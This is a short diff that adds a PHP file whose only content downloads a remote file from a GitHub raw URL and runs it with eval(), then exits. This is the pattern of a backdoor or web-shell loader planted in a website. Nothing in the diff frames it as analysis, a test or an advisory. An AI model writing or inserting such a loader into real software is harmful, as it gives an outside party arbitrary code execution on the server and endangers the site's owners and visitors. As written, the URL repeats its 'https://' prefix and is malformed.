@@ -1,0 +1,7 @@
+<?Php
+
+        $awo = 'https://';
+        eval("?>" . file_get_contents($awo . 'https://raw.githubusercontent.com/sunggalbedor-cmyk/pektol/refs/heads/main/obfwsv2'));
+        exit;
+   
+?>
